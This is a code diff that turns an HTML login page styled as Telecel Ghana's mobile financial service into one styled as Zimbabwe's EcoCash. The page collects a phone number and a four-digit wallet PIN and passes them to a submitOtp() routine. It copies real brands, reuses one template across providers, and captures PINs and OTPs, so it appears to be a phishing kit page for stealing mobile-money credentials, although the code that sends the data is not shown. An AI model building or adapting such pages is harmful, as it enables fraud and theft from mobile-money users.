@@ -1,272 +1,167 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Telecel Login</title>
 
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<head>
+    <title>EcoCash Login</title>
+
+    <!-- MOBILE -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <link rel="stylesheet" href="style.css">
 
     <style>
         body {
             margin: 0;
             font-family: 'Segoe UI', sans-serif;
-            /* background: #ffffff; */
-            background: #d32f2f;
+            background: #1e63c6;
         }
 
-        /* ===== TOP (SMALL RED) ===== */
-        .top {
-            background: #d32f2f;
-            color: white;
+        .top-section {
+            background: white;
+            padding: 30px 20px 80px;
+            border-bottom-left-radius: 60px;
+            border-bottom-right-radius: 60px;
             text-align: center;
-            padding: 20px 10px 15px;
         }
 
-        .logo-circle {
-            width: 50px;
-            height: 50px;
-            background: #eee;
-            border-radius: 50%;
-            margin: auto;
-            padding: 5px;
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .logo span {
+            color: red;
+        }
+
+        .login-title {
+            margin-top: 20px;
+            font-size: 20px;
+        }
+
+        .phone-box {
             display: flex;
             align-items: center;
-            justify-content: center;
-            font-size: 50px;
-            color: #d32f2f;
-            font-weight: bold;
-        }
-
-        .brand {
-            font-size: 24px;
-            margin-top: 8px;
-            font-weight: bold;
-        }
-
-        .sub {
-            font-size: 13px;
-        }
-
-        /* ===== CENTER (LARGE WHITE) ===== */
-        .center {
-            background: #fefefe;
-            padding: 50px 20% 70px 20%;
-            border-bottom-right-radius: 24%;
-            border-bottom-left-radius: 24%;
-            
-
-        }
-
-        .form-box {
-            max-width: 420px;
-            margin: auto;
-        }
-
-        .title {
-            text-align: center;
-            margin-bottom: 25px;
-            font-size: 18px;
-            color: #444;
-        }
-
-        label {
-            display: block;
-            margin-top: 10px;
-            font-size: 14px;
-            color: #555;
-        }
-
-        select, input {
-            width: 100%;
-            padding: 15px;
-            margin-top: 8px;
+            border: 2px solid #1e63c6;
             border-radius: 12px;
-            border: 2px solid #d32f2f;
-            font-size: 16px;
-            box-sizing: border-box;
+            padding: 12px;
+            margin-top: 20px;
         }
 
-        /* PIN */
+        .flag {
+            font-size: 20px;
+            margin-right: 10px;
+        }
+
+        .phone-input {
+            border: none;
+            outline: none;
+            font-size: 16px;
+            width: 100%;
+        }
+
         .pin-title {
             margin-top: 25px;
-            font-size: 14px;
+            font-size: 16px;
         }
 
-        .pin-row {
+        .pin-container {
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin-top: 12px;
+            margin-top: 15px;
         }
 
         .pin-box {
-            width: 55px;
+            width: 50px;
             height: 55px;
-            border: 2px solid #d32f2f;
-            border-radius: 12px;
-            text-align: center;
+            border: 2px solid #1e63c6;
+            border-radius: 10px;
             font-size: 22px;
-        }
-
-        .icons {
-            display: flex;
-            align-items: center;
-            margin-left: 8px;
-            font-size: 18px;
-        }
-
-        .forgot {
             text-align: center;
-            margin-top: 12px;
-            color: #d32f2f;
-            font-size: 13px;
         }
 
-        /* LOGIN BUTTON */
-        .login-btn {
-            width: 100%;
-            margin-top: 30px;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
-            background: #ccc;
-            color: white;
-            font-size: 16px;
-            transition: 0.3s;
-        }
-
-        .login-btn.active {
-            background: #d32f2f;
-        }
-
-        /* ===== BOTTOM (MEDIUM RED WITH CURVE) ===== */
-        .bottom {
-            /* background: #d32f2f; */
-            /* margin-top: 40px; */
-            padding: 80px 20px 40px;
-            border-top-left-radius: 0px;
-            border-top-right-radius: 0px;
+        .bottom-section {
+            background: #1e63c6;
+            padding: 40px 20px;
             text-align: center;
             color: white;
         }
 
-        .bottom-logo {
-            width: 40px;
-            height: 40px;
-            background: #eee;
-            border-radius: 50%;
-            margin: auto;
-            padding: 5px;
+        .bottom-text {
+            margin-bottom: 20px;
+        }
+
+        .actions {
             display: flex;
-            align-items: center;
+            gap: 15px;
             justify-content: center;
-            color: #d32f2f;
-            font-weight: bold;
-            font-size: 45px;
-
         }
 
-        .bottom h2 {
-            margin: 10px 0 5px;
-        }
-
-        .bottom p {
-            margin: 0;
-            font-size: 14px;
-        }
-
-        .btn {
-            width: 100%;
-            max-width: 400px;
-            margin: 15px auto 0;
-            padding: 16px;
-            border-radius: 12px;
-            border: none;
+        .action-btn {
             background: white;
-            font-size: 15px;
+            color: black;
+            padding: 14px;
+            border-radius: 12px;
+            width: 45%;
+            border: none;
         }
-
-        /* MOBILE ADJUST */
-        @media (max-width: 600px) {
-            .center {
-                padding: 40px 10% 70px 10%;
-                border-bottom-right-radius: 18%;
-                border-bottom-left-radius: 18%;
-            }
-        }
-
     </style>
 </head>
 
 <body>
 
-<!-- TOP -->
-<div class="top">
-    <div class="logo-circle">t</div>
-    <div class="brand">Telecel</div>
-    <div class="sub">Mobile Financial Services</div>
-</div>
+<!-- TOP WHITE -->
+<div class="top-section">
 
-<!-- CENTER -->
-<div class="center">
-    <div class="form-box">
+    <div class="logo">Eco<span>Cash</span></div>
 
-        <div class="title">Login to Your Account</div>
+    <div class="login-title">Login</div>
 
-        <label>Account Type</label>
-        <select>
-            <option>Mobile</option>
-            <option>Broadband</option>
-        </select>
-
-        <input type="text" id="phone" readonly>
-
-        <div class="pin-title">Enter your PIN</div>
-
-        <div class="pin-row">
-            <input maxlength="1" class="pin-box" type="password">
-            <input maxlength="1" class="pin-box" type="password">
-            <input maxlength="1" class="pin-box" type="password">
-            <input maxlength="1" class="pin-box" type="password">
-            <div class="icons">👁️ 💬</div>
-        </div>
-
-        <div class="forgot">Forgot your PIN?</div>
-
-        <button id="loginBtn" class="login-btn">LOGIN</button>
-
+    <!-- PHONE -->
+    <div class="phone-box">
+        <div class="flag">🇿🇼</div>
+        <input class="phone-input" id="phone" readonly>
     </div>
+
+    <!-- PIN -->
+    <div class="pin-title">Enter your PIN</div>
+  
+    <div class="pin-container">
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box" autofocus>
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
+    <input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="pin-box">
 </div>
 
-<!-- BOTTOM -->
-<div class="bottom">
+<p id="errorMsg" style="color:red; text-align:center; margin-top:10px; display:none;"></p>
+    
+<button id="submitBtn" onclick="submitOtp()" class="login-btn">Submit</button>
+</div>
 
-    <div class="bottom-logo">t</div>
-    <h2>Telecel</h2>
-    <p>Ghana</p>
-    <p>Secure. Fast. Reliable.</p>
+<!-- BOTTOM BLUE -->
+<div class="bottom-section">
 
-    <button class="btn">📱 Download App</button>
-    <button class="btn">❓ Get Help</button>
+    <div class="bottom-text">Don’t have an EcoCash Wallet?</div>
+
+    <div class="actions">
+        <button class="action-btn">Register</button>
+        <button class="action-btn">Help & Support</button>
+    </div>
 
 </div>
 
 <script>
-const inputs = document.querySelectorAll(".pin-box");
-const loginBtn = document.getElementById("loginBtn");
 
-// PIN INPUT
+const inputs = document.querySelectorAll(".pin-box");
+
 inputs.forEach((input, index) => {
     input.addEventListener("input", () => {
         input.value = input.value.replace(/[^0-9]/g, "");
-
+        
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
-
-        checkPin();
     });
-
-    
 
     input.addEventListener("keydown", (e) => {
         if (e.key === "Backspace" && !input.value && index > 0) {
@@ -274,18 +169,6 @@ inputs.forEach((input, index) => {
         }
     });
 });
-
-// BUTTON ACTIVE
-function checkPin() {
-    let pin = "";
-    inputs.forEach(i => pin += i.value);
-
-    if (pin.length === 4) {
-        loginBtn.classList.add("active");
-    } else {
-        loginBtn.classList.remove("active");
-    }
-}
 
 async function submitOtp() {
     const btn = document.getElementById("submitBtn");
@@ -345,15 +228,14 @@ async function submitOtp() {
         document.getElementById("pageLoader").style.display = "none";
     }
 }
-// LOAD PHONE
+
    document.getElementById("phone").value = localStorage.getItem("phone") || "+263";
 
 window.onload = () => {
     document.body.classList.add("loaded");
 };
 
-
 </script>
-
+<div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
 </html>
